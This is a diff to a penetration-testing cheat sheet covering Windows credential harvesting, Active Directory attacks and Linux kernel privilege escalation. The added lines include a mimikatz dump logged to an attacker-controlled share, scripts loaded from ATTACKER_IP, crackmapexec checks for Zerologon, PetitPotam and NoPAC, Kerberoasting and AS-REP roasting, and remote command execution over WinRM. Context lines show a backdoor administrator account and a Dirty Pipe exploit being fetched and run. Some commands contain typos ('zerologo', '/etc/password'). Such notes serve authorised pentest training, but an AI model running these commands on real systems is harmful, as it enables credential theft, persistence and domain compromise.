@@ -3554,7 +3554,7 @@ netsh firewall show config
 # Installed Software
 powershell -c "Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | select displayname, DisplayVersion"
 powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion"
-dir /b/a:d "C:\Program files" "C:\Program Files (x86)" | sort
+dir /b/a:d "C:\Program files" "C:\Program Files (x86)" | sort /unique
 wmic product get name,version
 powershell -c "Get-WmiObject -Class Win32_Product | Select-Object -Property Name,Version"
 
@@ -3607,12 +3607,14 @@ powershell -c "(Get-PSReadlineOption).HistorySavePath"
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
 # if so, view powershell command history with:
-Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | Format-List
+Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | fl
 # search powershell history for secrets:
 Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104 | select message | Select-String -Pattern "secret" # also try 'secur' and 'passw'
 
 # User files that may have juicy data
-powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue"
+powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*pst,*.ost,*.eml,*.msg,*.log -File -Recurse -ErrorAction SilentlyContinue"
+# alternative
+dir /a-d /s/b C:\users | findstr /ilvC:\AppData\ /C:\desktop.ini /C:\ntuser.dat /C:"\All Users\VMware" /C:"\All Users\USOShared" /C:"\All Users\Package" /C:"\All Users\Microsoft"
 
 # Check if plaintext creds stored by Wdigest (key exists, not set to 0)
 # typically only common in Windows 7 and earlier
@@ -3719,7 +3721,7 @@ impacket-smbserver -smb2support -user derp -password herpderp share .
 # or
 powershell -ep bypass
 . \\ATTACKER_IP\share\PowerUp.ps1
-Invoke-PrivescAudit
+Invoke-AllChecks
 
 # PowerUp, individually:
 Get-UnquotedService
@@ -4936,22 +4938,24 @@ The format of mimikatz commands is `module::command`.
 
 ```powershell
 .\mimikatz.exe
+# start logging session to file
+log \\ATTACKER_IP\share\mimikatz.log
 # enable full debug privileges to have access to system memory
 privilege::debug
 # elevate to system
 token::elevate
 # get hashes and try to print plaintext passwords
 sekurlsa::logonpasswords
-# tries to extract plaintext passwords from lsass memory
-sekurlsa::wdigest
 # dump hashes from SAM
 lsadump::sam
 # list all available kerberos tickets
 sekurlsa::tickets
-# Get just the krbtgt kerberos tikcket
-sekurlsa::krbtgt
 # List Current User's kerberos tickets
 kerberos::list
+# tries to extract plaintext passwords from lsass memory
+sekurlsa::wdigest
+# Get just the krbtgt kerberos tikcket
+sekurlsa::krbtgt
 
 # patch CryptoAPI to make non-exportable PKI keys exportable
 crypto::capi
@@ -5086,7 +5090,7 @@ Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
 net user derp herpderp /add
 net localgroup Administrators derp /add
 net localgroup "Remote Desktop Users" derp /ADD
-# enable remote desktop
+# enable remote desktop / enable rdp
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 # delete user
 net user derp /del
@@ -5210,7 +5214,7 @@ powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt
 
 Members of the *Domain Admins* group have administrative privileges on the DC, so they are key targets. Large enterprises group multiple AD domains into a tree, and some go further, grouping trees into an AD forest. *Enterprise Admins* have full administrative rights over all DCs in the entire AD forest, and are the most valuable user accounts to compromise.
 
-The *Primary Domain Controller (PDC)* is the "master," and there can be only one in a domain. It's the one with the *PdcRoleOwner* property. This is the best DC to use when querying for domain information because it's the most up-to-date.
+The *Primary Domain Controller (PDC)* is the master, and there can be only one in a domain. It's the one with the *PdcRoleOwner* property. This is the best DC to use when querying for domain information because it's the most up-to-date.
 
 *Lightweight Directory Access Protocol (LDAP)* is the protocol used to query and communicate with Active Directory. To communicate to a host (DC) using LDAP, we need to use it's Active Directory Services Path (ADSPath), which looks like:
 
@@ -5225,8 +5229,8 @@ A DistinguishedName is basically a full domain name, split on periods with "DC="
 In Windows, *Active Directory Services Interface (ADSI)* is a set of COM interfaces that acts as an LDAP provider for programatic communication over LDAP (e.g. via .NET/PowerShell).
 
 When trying to access an object (like a share drive) in AD, permissions are managed by *Access Control Lists (ACLs)*, which are composed of *Access Control Entries (ACEs)*. ACEs can be configured to provide many different **permission types**. From an attacker perspective, these are the most interesting ones:
-- *GenericAll*: Full permissions on object
-- *GenericWrite*: Edit certain attributes on the object
+- *GenericAll*: Full permissions over object
+- *GenericWrite*: Edit certain attributes of the object
 - *WriteOwner*: Change ownership of the object
 - *WriteDACL*: Edit ACE's applied to object
 - *AllExtendedRights*: Change password, reset password, etc.
@@ -5237,21 +5241,37 @@ When trying to access an object (like a share drive) in AD, permissions are mana
 ## 5.1 Active Directory Enumeration
 
 Checklist:
+- [ ] Known DC vulnerabilities:
+	- [ ] Zerologon
+	- [ ] PetitPotam
+	- [ ] NoPAC (once you have a user's creds)
 - [ ] Kerberoastable accounts
 - [ ] AS-REP Roastable accounts
-- [ ] Find Workstations where Domain Users can RDP
-- [ ] Find Servers where Domain Users can RDP
-- [ ] Find Computers where Domain Users are Local Admin
+- [ ] Find computers where Domain Users can RDP
+- [ ] Find computers where Domain Users are Local Admin
 - [ ] Shortest Path to Domain Admins (esp. from Owned Principals)
 - [ ] Write-permissions on any critical accounts?
 - [ ] Enumerate:
 	- [ ] Users (interesting permissions)
-	- [ ] Groups (incl. memberships)
-	- [ ] Services
+	- [ ] Groups (memberships)
+	- [ ] Services (which hosts? users w/ SPNs?)
 	- [ ] Computers (which ones have useful sessions?)
 
+When you start your internal pentest, these are the first modules you should try:
 
-Before starting, get the tools you might need ready:
+```sh
+# Zerologon
+crackmapexec smb DC_IP -u '' -p '' -M zerologo
+
+# PetitPotam
+crackmapexec smb DC_IP -u '' -p '' -M petitpotam
+
+# NoPAC (requires credentials)
+crackmapexec smb DC_IP -u 'user' -p 'pass' -M nopac
+```
+
+
+Before starting enumeration, get the tools you might need ready:
 
 ```sh
 # WinPEAS for automated Windows enumeration
@@ -5279,6 +5299,10 @@ unzip -d mimikatz mimikatz.zip
 
 # Rubeus.exe for AS-REP roasting, etc.
 wget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+
+# chisel for port redirection/tunneling
+echo 'DOWNLOAD chisel!'
+echo 'https://github.com/jpillora/chisel/releases'
 
 # plink.exe for port redirection/tunneling
 cp /usr/share/windows-resources/binaries/plink.exe .
@@ -5442,6 +5466,13 @@ Get-Domain
 # list all domain controllers
 Get-DomainController
 
+
+# List AS-REP Roastable users
+Get-DomainUser -PreauthNotRequired | select samaccountname
+# Kerberoast all kerberoastable users
+Invoke-Kerberoast | fl
+# Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts. (takes time)
+Invoke-UserHunter -CheckAccess
 # complete information about a single user to view available fields
 Get-NetUser | Select -First 1
 # complete information about specific user
@@ -5452,6 +5483,8 @@ Get-NetUser | select samaccountname,pwdlastset,lastlogon
 # list of all service accounts, or Service Principal Names (SPNs)
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
 
+# Find interesting ACLs (takes time)
+Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights | fl
 # list of all ACEs (permissions) for specific user
 Get-ObjectAcl -Identity USER_OR_GROUP_NAME
 # filter list for "interesting" permissions
@@ -5480,7 +5513,7 @@ Resolve-IPAddress -ComputerName NAME
 Find-LocalAdminAccess
 # finds reachable shares on domain machines
 Find-DomainShare
-Find-DomainShare -CheckShareAccess # only list those we can access
+Find-DomainShare -CheckShareAccess|fl # only list those we can access
 # finds domain machines where specific users are logged into
 Find-DomainUserLocation
 # enumerates the members of specified local group on machines in the domain
@@ -5793,7 +5826,10 @@ When requesting the service ticket from the KDC, no checks are performed to conf
 Obtaining the SPN Hashes:
 
 ```powershell
-# Windows: use Rubeus
+# Windows: using PowerView.ps1
+Invoke-Kerberoast | fl
+
+# Windows: using Rubeus
 # '/tgtdeleg' tries to downgrade encryption to RC4
 .\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.hash
 
@@ -5980,6 +6016,8 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 New-PSSession -ComputerName $victim -Credential $credential
 # interactive session
 Enter-PSSession 1
+# run specific remote commands
+Invoke-Command -ComputerName $victim -Credential $Cred -ScriptBlock { cmd.exe }
 ```
 
 Abusing WinRM from Kali (allows pass the hash):
@@ -6892,6 +6930,8 @@ gcc cve-2017-16995.c -o cve-2017-16995
 #### 6.2.8.4 Dirty Pipe
 
 [CVE-2022-0847](https://nvd.nist.gov/vuln/detail/CVE-2022-0847) affects Linux kernels 5.8.x up. The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
+- Ubuntu 20.04 - 21.04
+- Debian 11
 - RHEL 8.0 - 8.4
 - Fedora 35
 
@@ -6902,7 +6942,12 @@ python -m http.server 80
 # on victim
 wget LISTEN_IP/exploit.c
 gcc exploit.c -o exploit # may need to compile locally with "-static"
-./exploit # if statically compiled, may complain about system() failing, but ok
+./exploit # if statically compiled, may complain about system() failing, but might be ok
+
+# check if exploit worked
+grep root /etc/password # should see hash with 'aaron' salt
+
+# become r00t
 su - # use password 'aaron'
 
 # to restore to pre-exploit state
